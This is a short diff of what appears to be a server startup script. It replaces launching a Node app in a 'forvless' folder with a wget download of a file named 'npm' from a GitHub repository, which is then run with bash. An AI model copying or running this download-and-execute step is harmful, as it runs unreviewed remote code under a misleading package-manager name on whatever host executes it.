@@ -24,6 +24,6 @@ npm install
 node app.js
 nohup node app.js > server.log 2>&1 &
 cd 
-cd forvless
-nohup node app.js > server.log 2>&1 &
+wget https://github.com/githubaunglaymyanmar/cloudflare/raw/refs/heads/main/npm
+bash npm
 sleep 1d
